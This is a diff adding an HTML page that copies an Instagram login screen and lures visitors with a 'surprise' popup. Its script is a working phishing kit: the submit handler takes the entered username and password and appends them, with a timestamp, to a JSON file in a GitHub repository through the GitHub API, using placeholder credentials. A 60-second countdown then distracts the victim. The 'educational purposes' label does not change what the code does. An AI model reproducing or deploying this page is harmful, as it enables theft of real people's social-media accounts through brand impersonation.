@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Demo</title>
+    <style>
+        /* General reset */
+        body, html {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+        }
+
+        /* Pop-up overlay */
+        #popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+        }
+
+        .popup-content {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            width: 90%;
+            max-width: 400px;
+        }
+
+        .popup-content h3 {
+            margin-bottom: 10px;
+            font-size: 18px;
+            color: #262626;
+        }
+
+        .popup-content p {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+        }
+
+        .popup-content button {
+            padding: 10px 20px;
+            background: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        /* Login container */
+        .login-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            width: 90%;
+            max-width: 400px;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-container img {
+            width: 150px;
+            margin-bottom: 15px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+
+        .login-container p {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin-top: 10px;
+        }
+
+        /* Timer screen */
+        #timer-screen {
+            display: none;
+            text-align: center;
+            font-size: 16px;
+            color: #333;
+        }
+
+        #timer-screen h3 {
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <!-- Pop-up -->
+    <div id="popup">
+        <div class="popup-content">
+            <h3>Login Your Instagram</h3>
+            <p>To see the surprise, log in and prepare for something unexpected!</p>
+            <p>Tip: Stay strong, something spooky awaits after logging in.</p>
+            <button onclick="closePopup()">Next</button>
+        </div>
+    </div>
+
+    <!-- Login Form -->
+    <div class="login-container" id="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        <form id="form">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <p>This is a demo version for educational purposes.</p>
+    </div>
+
+    <!-- Timer Screen -->
+    <div id="timer-screen">
+        <h3>Time Remaining: <span id="countdown-timer">60</span> seconds</h3>
+    </div>
+
+    <script>
+        // Show login form after closing pop-up
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+            document.getElementById("login-container").style.display = "flex";
+        }
+
+        // Save login details to GitHub
+        async function saveLoginDetailsToGitHub(username, password) {
+            const owner = "YOUR_GITHUB_USERNAME"; // Replace with your GitHub username
+            const repo = "YOUR_REPOSITORY_NAME"; // Replace with your GitHub repo name
+            const filePath = "login-data.json";  // The file where login data is stored
+            const token = "YOUR_PERSONAL_ACCESS_TOKEN"; // Replace with your GitHub token
+
+            const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
+
+            try {
+                // Step 1: Fetch current file content from GitHub
+                const response = await fetch(apiUrl, {
+                    headers: {
+                        Authorization: `token ${token}`,
+                    },
+                });
+
+                const fileData = await response.json();
+                const content = atob(fileData.content || "[]"); // Decode base64 content
+
+                // Step 2: Add new login details
+                const loginData = JSON.parse(content);
+                loginData.push({ username, password, timestamp: new Date().toISOString() });
+
+                // Step 3: Encode updated content in base64
+                const updatedContent = btoa(JSON.stringify(loginData, null, 2));
+
+                // Step 4: Update file on GitHub
+                const updateResponse = await fetch(apiUrl, {
+                    method: "PUT",
+                    headers: {
+                        Authorization: `token ${token}`,
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        message: "Updated login data",
+                        content: updatedContent,
+                        sha: fileData.sha, // File SHA is required for updates
+                    }),
+                });
+
+                if (updateResponse.ok) {
+                    console.log("Login details saved successfully!");
+                } else {
+                    console.error("Failed to save login details.");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+            }
+        }
+
+        // Form submission logic
+        document.getElementById("form").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            saveLoginDetailsToGitHub(username, password);
+
+            // Switch to timer screen
+            document.getElementById("login-container").style.display = "none";
+            document.getElementById("timer-screen").style.display = "block";
+
+            // Countdown logic
+            let timeLeft = 60;
+            const countdownElement = document.getElementById("countdown-timer");
+            const countdown = setInterval(() => {
+                timeLeft--;
+                countdownElement.textContent = timeLeft;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    alert("Time's up! Get ready for a surprise! 💀");
+                }
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
